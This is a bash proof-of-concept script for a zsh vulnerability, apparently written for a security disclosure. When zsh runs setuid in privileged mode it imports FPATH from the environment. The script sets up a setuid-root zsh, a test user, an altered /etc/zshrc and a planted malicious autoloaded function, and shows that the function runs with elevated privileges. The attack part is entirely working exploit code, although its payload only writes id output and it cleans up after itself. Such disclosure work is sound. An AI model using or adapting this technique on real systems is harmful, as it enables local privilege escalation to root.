#!/bin/bash
# Finding 3 PoC: FPATH is imported from the environment in PRIVILEGED mode,
# allowing an attacker to poison autoloaded function resolution.
#
# On real systems, system-wide /etc/zshrc commonly calls `autoload -Uz compinit`
# or similar, which loads functions from FPATH -- including attacker-controlled
# directories. Global rc files are sourced even in PRIVILEGED mode.
#
# This PoC demonstrates two things:
#   1. FPATH is imported from the environment in PRIVILEGED mode (no PM_DONTIMPORT_SUID)
#   2. Autoloading from the attacker-controlled FPATH works during PRIVILEGED execution
#
# Must be run as root (to create the setuid binary). Self-cleaning.
set -euo pipefail

ZSH_BIN="${1:?usage: finding3_fpath_poc.sh /path/to/built/zsh}"
WORK=/tmp/finding3_poc
SUID_ZSH="$WORK/zsh-suid"
EVIL_FPATH="$WORK/evil_fpath"
VICTIM_HOME="$WORK/victim_home"
PROOF="$WORK/proof.txt"
GLOBAL_ZSHRC_BAK=""

cleanup() {
    rm -rf "$WORK"
    # Restore original /etc/zshrc if we backed it up
    if [ -n "$GLOBAL_ZSHRC_BAK" ] && [ -f "$GLOBAL_ZSHRC_BAK" ]; then
        mv "$GLOBAL_ZSHRC_BAK" /etc/zshrc
    elif [ -n "$GLOBAL_ZSHRC_BAK" ]; then
        rm -f /etc/zshrc
    fi
    id poc_fpath_attacker >/dev/null 2>&1 && userdel -rf poc_fpath_attacker 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] real/effective uid of this whole demo: $(id)"
echo

# === Setup ===
mkdir -p "$WORK" "$EVIL_FPATH" "$VICTIM_HOME"

# Create setuid-root zsh
cp "$ZSH_BIN" "$SUID_ZSH"
chown root:root "$SUID_ZSH"
chmod 4755 "$SUID_ZSH"
echo "[setup] installed setuid-root zsh at $SUID_ZSH:"
ls -la "$SUID_ZSH"

# Create unprivileged test user
id poc_fpath_attacker >/dev/null 2>&1 || useradd -m -d "$VICTIM_HOME" -s /bin/bash poc_fpath_attacker
chown poc_fpath_attacker:poc_fpath_attacker "$VICTIM_HOME"
chmod 755 "$EVIL_FPATH"  # attacker-writable
chown poc_fpath_attacker:poc_fpath_attacker "$EVIL_FPATH"
echo "[setup] unprivileged test account: $(id poc_fpath_attacker)"

# Back up and create a realistic /etc/zshrc that autoloads a function
# (This simulates what macOS, Ubuntu, Fedora, etc. ship by default)
if [ -f /etc/zshrc ]; then
    GLOBAL_ZSHRC_BAK="$WORK/zshrc.bak"
    cp /etc/zshrc "$GLOBAL_ZSHRC_BAK"
fi
cat > /etc/zshrc <<'SYSRC'
# Simulated system-wide zshrc (like macOS/Ubuntu/Fedora ship)
# This autoloads a completion function -- standard practice
autoload -Uz _system_setup
_system_setup 2>/dev/null
SYSRC

echo "[setup] created /etc/zshrc with autoload (simulating real-world system config)"
echo

# === Scenario A: control -- PRIVILEGED, normal FPATH ===
echo "=== SCENARIO A (control): PRIVILEGED session, default FPATH ==="
rm -f "$PROOF"
# Run as unprivileged user, normal FPATH
su poc_fpath_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    echo exit | '$SUID_ZSH' -p -l -i 2>&1 | tail -3 || true
" || true
if [ -f "$PROOF" ]; then
    echo "  RESULT: function ran -- $(cat "$PROOF")"
else
    echo "  RESULT: autoloaded function did not run (FPATH doesn't point to attacker dir)"
fi
echo

# === Scenario B: the bug -- PRIVILEGED, attacker-controlled FPATH ===
echo "=== SCENARIO B (the bug): PRIVILEGED session, attacker-controlled FPATH ==="

# Attacker plants a malicious autoloaded function
su poc_fpath_attacker -s /bin/bash -c "
    cat > '$EVIL_FPATH/_system_setup' <<'EOFUNC'
# Malicious autoloaded function -- replaces the real _system_setup
id > $PROOF
echo \"FPATH POISONED: autoloaded function ran as \$(id -un), euid=\$(id -u)\" >> $PROOF
EOFUNC
    chmod 644 '$EVIL_FPATH/_system_setup'
"
echo "[attacker] planted malicious _system_setup in $EVIL_FPATH"

rm -f "$PROOF"
# Run as unprivileged user with poisoned FPATH (prepended before real path)
su poc_fpath_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    export FPATH='$EVIL_FPATH:/usr/share/zsh/functions'
    echo exit | '$SUID_ZSH' -p -l -i 2>&1 | tail -3 || true
" || true

if [ -f "$PROOF" ]; then
    echo "  RESULT: FPATH-poisoned function FIRED"
    echo "  --- proof file contents ---"
    cat "$PROOF"
else
    echo "  RESULT: function did not fire"
fi
echo

# === Scenario C: comparison -- what MODULE_PATH does (correctly blocked) ===
echo "=== SCENARIO C (comparison): MODULE_PATH is correctly blocked in PRIVILEGED ==="
rm -f "$PROOF"
su poc_fpath_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    export MODULE_PATH='/tmp/evil_modules'
    printf 'echo \$MODULE_PATH\nexit\n' | '$SUID_ZSH' -p -l -i 2>&1 | grep -v '^$' | tail -5 || true
" || true
echo "  (MODULE_PATH should NOT contain /tmp/evil_modules -- it's correctly PM_DONTIMPORT)"
echo

# === Scenario D: direct proof FPATH is imported in PRIVILEGED mode ===
echo "=== SCENARIO D: directly proving FPATH is imported in PRIVILEGED mode ==="
su poc_fpath_attacker -s /bin/bash -c "
    export HOME='$VICTIM_HOME' ZDOTDIR='$VICTIM_HOME'
    export FPATH='/ATTACKER/CONTROLLED/PATH:/usr/share/zsh/functions'
    printf 'echo FPATH=\$FPATH\nexit\n' | '$SUID_ZSH' -p -l -i 2>&1 | grep 'FPATH=' | tail -1 || true
" || true
echo "  (FPATH should contain /ATTACKER/CONTROLLED/PATH -- it's NOT blocked by PM_DONTIMPORT_SUID)"
